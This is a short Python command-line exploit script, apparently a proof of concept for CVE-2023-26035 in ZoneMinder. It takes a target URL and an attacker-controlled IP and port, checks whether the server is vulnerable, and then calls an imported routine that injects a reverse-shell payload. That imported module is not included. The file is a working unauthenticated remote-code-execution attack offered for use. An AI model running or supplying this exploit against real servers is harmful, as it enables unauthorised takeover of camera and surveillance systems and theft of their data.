from argparse import ArgumentParser
from zoneminder_snapshots import ZoneminderSnapshots

parser = ArgumentParser('Zoneminder Unauthenticated RCE Reverse Shell', 'This script causes a webserver running Zoneminder (< 1.36.33 and < 1.37.33) to execute a reverse shell through the security flaw described in CVE 2023-26035')

parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
parser.add_argument('-i', '--ip', type=str, required=True, help='IP or domain for the target to connect on the reverse shell')
parser.add_argument('-p', '--port', type=int, required=True, help='Port for the target to connect on the reverse shell')

args = parser.parse_args()

print('[!] BE SURE TO BE LISTENING ON THE PORT YOU INFORMED [!]\n')

print('[+] Initializing [+]')

snapshots = ZoneminderSnapshots(args.url, args.ip, args.port)

print('[!] Checking if target is vulnerable [!]')

if snapshots.check_vulnerable():
    print('[+] Target is vulnerable [+]')
    print('[!] Sending payload [!]')

    snapshots.inject_reverse_shell()

    print('[+] Payload sent [+]')
